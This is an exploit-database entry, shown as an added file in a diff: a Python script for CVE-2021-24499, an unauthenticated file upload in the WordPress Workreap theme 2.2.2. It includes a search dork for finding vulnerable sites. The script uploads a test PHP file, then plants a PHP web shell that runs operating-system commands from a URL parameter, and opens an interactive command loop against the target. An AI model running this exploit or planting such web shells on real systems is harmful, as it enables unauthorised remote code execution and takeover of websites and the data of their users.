@@ -1,0 +1,87 @@
+id: 38775
+date: 06/12/2023
+title: WordPress Workreap 2.2.2 Shell Upload Exploit
+author: Mohammad Hossein Khanaki
+cves: CVE-2021-24499
+
+# Exploit Title: WordPress Theme Workreap 2.2.2 - Unauthenticated Upload Leading to Remote Code Execution
+# Dork: inurl:/wp-content/themes/workreap/
+# Category : Webapps
+# Vendor Homepage: https://themeforest.net/item/workreap-freelance-marketplace-wordpress-theme/23712454
+# Exploit Author: Mohammad Hossein Khanaki(Mr_B0hl00l)
+# Version: 2.2.2
+# Tested on: Windows/Linux
+# CVE: CVE-2021-24499
+
+
+import requests
+import random
+import string
+import sys
+
+
+def usage():
+    banner = '''
+    NAME: WordPress Theme Workreap 2.2.2 - Unauthenticated Upload Leading to Remote Code Execution
+    usage: python3 Workreap_rce.py <URL> 
+    example for linux : python3 Workreap_rce.py https://www.exploit-db.com
+    example for Windows : python Workreap_rce.py https://www.exploit-db.com
+    '''
+    print(f"{BOLD}{banner}{ENDC}")
+
+def upload_file(target):
+    print("[ ] Uploading File")
+    url = target + "/wp-admin/admin-ajax.php"
+    body = "<?php echo '" + random_str + "';?>"
+    data = {"action": "workreap_award_temp_file_uploader"}
+    response = requests.post(url, data=data, files={"award_img": (file_name, body)})
+    if '{"type":"success",' in response.text:
+        print(f"{GREEN}[+] File uploaded successfully{ENDC}")
+        check_php_file(target)
+    else:
+        print(f"{RED}[+] File was not uploaded{ENDC}")
+
+def check_php_file(target):
+    response_2 = requests.get(target + "/wp-content/uploads/workreap-temp/" + file_name)
+    if random_str in response_2.text:
+        print(f"{GREEN}The uploaded PHP file executed successfully.{ENDC}")
+        print("path: " + target +"/wp-content/uploads/workreap-temp/" + file_name)
+        question = input(f"{YELLOW}Do you want get RCE? [Y/n] {ENDC}")
+        if question == "y" or question == "Y":
+            print("[ ] Uploading Shell ")
+            get_rce(target)
+        else:
+            usage()
+    else:
+        print(f"{RED}[+] PHP file not allowed on this website. Try uploading another file.{ENDC}")
+
+def get_rce(target):
+    file_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + ".php"
+    body = '<?php $command = $_GET["c"]; $output = shell_exec($command); echo "<pre>\n$output</pre>";?>'
+    data = {"action": "workreap_award_temp_file_uploader"}
+    response_3 = requests.post(target + '/wp-admin/admin-ajax.php', data=data, files={"award_img": (file_name, body)})
+    print(f"{GREEN}[+] Shell uploaded successfully{ENDC}")
+    while True:
+        command = input(f"{YELLOW}Enter a command to execute: {ENDC}")
+        print(f"Shell Path : {target}'/wp-content/uploads/workreap-temp/{BOLD}{file_name}?c={command}{ENDC}")
+        response_4 = requests.get(target + '/wp-content/uploads/workreap-temp/' + file_name + f"?c={command}")
+        print(f"{GREEN}{response_4.text}{ENDC}")
+
+
+if __name__ == "__main__":
+    global GREEN , RED, YELLOW, BOLD, ENDC
+    GREEN = '\033[92m'
+    RED = '\033[91m'
+    YELLOW = '\033[93m'
+    BOLD = '\033[1m'
+    ENDC = '\033[0m'
+    file_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + ".php"
+    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+    try:
+        upload_file(sys.argv[1])
+    except IndexError:
+            usage()
+    except requests.exceptions.RequestException as e:
+        print("\nPlease Enter Valid Address")
+
+#  0day.today [2023-06-23]  #
